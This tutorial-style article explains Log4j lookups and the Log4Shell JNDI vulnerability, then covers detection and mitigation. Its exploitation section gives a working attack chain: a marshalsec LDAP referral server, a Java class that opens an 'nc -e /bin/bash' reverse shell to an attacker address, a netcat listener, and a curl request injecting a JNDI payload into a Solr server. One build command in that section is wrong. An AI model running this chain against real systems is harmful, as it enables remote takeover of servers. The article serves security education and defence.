#### Pre-requisites to this article
- Knows how to print **Hello World** in Java

Ah nevermind, this is how we do it
```java
class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!"); 
    }
}
```

#### 1. What is a Logger
- In applications (usually Server based where no GUI is present) loggers are used to store all the activities that happens within an application. 
- It keeps a record of the 
	- debug messages, 
	- what events has happened, 
	- any crashes or bugs, 
	- Http requests to the app etc
- Logging in Java ecosystem can be done via Java's default printing statement ie **System.out.println()**, but it has its own limitations for example we cannot easily change log priority levels, turn it off, customize it, etc .

#### 2. Log4J
 
Is an advanced Logging Package by Apache.
-  Advantages of Log4J over System.out.println()
	-  Log messages with five priority levels	(debug, info, warn, error, fatal)
	- Save logs in a file
	- Use **Lookups** to enrich logs 
	

 - Lookups: Allows Template variable ${} while logging data. It adds extra logic to logs by parsing or interpolating entries to enrich the data, **it can also take actions and even evaluate code based off the entry data. **

Examples: 
```js
logger.info("Todays date is 16/12/2021");
logger.info("Todays date is ${date:now}");
...
logger.info("${java:version}");
logger.info("${jndi:ldap://url.com}");
```

Lookups in Log4j:
 - Date
 - ENV
 - Docker
 - JNDI ( over LDAP, DNS, RMI)
	 


The above JNDI syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or references.

 Other locations for JNDI Lookups:

-   Input boxes, user and password login forms, data entry points within applications
-   HTTP headers such as **User-Agent** , **X-Forwarded-For**, or other customizable headers
-   Any place for user-supplied data

### 3. Exploitation :
- Java App with Vulnerable Log4j
```url
https://ec2-XX-XX-XX-XX.ap-south-1.
compute.amazonaws.com:8983/solr/#/
```

- Setup local LDAP server which will Refer to another server that will host Exploit
```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.XX.XX.XX:8000/#Exploit"
```
- Exploit.java file
```java
public class Exploit {
	static{
		try {
			java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.XX.XX.XX 9999");
		}
		catch (Exception e) {
			e.printStackTrace();
		}	
	}
}
```
- Server that will host Exploit.class
```bash
gcc Exploit.class -o Exploit
python3 -m http.server 8000
```
- A listener on Attackers system for reverse shell
```bash
nc -nlvp 9999
```

- Inject Malicious JNDI lookup in parameter
```bash
curl 'https://ec2-XX-XX-XX-XX.ap-south-1.
compute.amazonaws.com:8983/solr/admin/
cores?foo=$\{jndi:ldap://10.XX.XX.XX:1389/Exploit\}'
```
### 4. Threat :
Possible threats but not limited to: 
  - Dropping Cyptocurrency Mners 
  - RATs
  - Backdoors
  - Deploying ransomware
  - Post Exploitation
    - Privilege escalation, 
    - Exfiltration, 
    - Install Persistence, 
    - Perform lateral movement

### 5. Detection

Had it been just an independent vulnerable Log4j release in itself then we could simply updated or apply patches. But this logging utility is being used by 100s of Products as a dependency by Vendors viz Apache, AWS, VMware etc to log their data hence there could be a vulnerable Log4j hidden several levels down the application.

1. #### From Source Code
	- Print all the dependencies used in project `mvn dependency:tree -Dverbose`
	- [Vendors Advisories](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592) for products affected 
	- Analyse Log files to check entries of log4j - [Log4shell-detector](https://github.com/Neo23x0/log4shell-detector)


2. #### From Complied Java applications (JAR)

	- SBOM search: 
		- Software Bill Of Material
		- Scan JAR packages/dependencies if they contain vulnerable Log4j
		- Surface level Packages/dependencies can be checked manually.
		- Scanning Nested Packages is a bit complex, and can be done via
		- tools in the wild: [SYFT](https://github.com/anchore/syft), whose output is fed to [GRYPE](https://github.com/anchore/grype)


### 6. Migations :
(At the time of writing is article)

Specific to independent Log4j, refer [Vendors Advisories](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592) for other products affected 
- WAF rules 
- Upgrade to the Latest release : Only available for Java 8 or later
- Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon).
- Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 

---
- old
	- For >=2.10, set system property `java -Dlog4j2.formatMsgNoLookups` or the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS`to `true`
	- For releases from 2.0-beta9 to 2.10.0, the mitigation is to remove the `JndiLookup`class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
	- For AWS, Cloudflare https://github.com/OllieJC/aws-log4j-mitigations
  
  Note: There is no simple way to weed out malicious requests with a simple WAF rule because Log4Shell payloads may be nested.
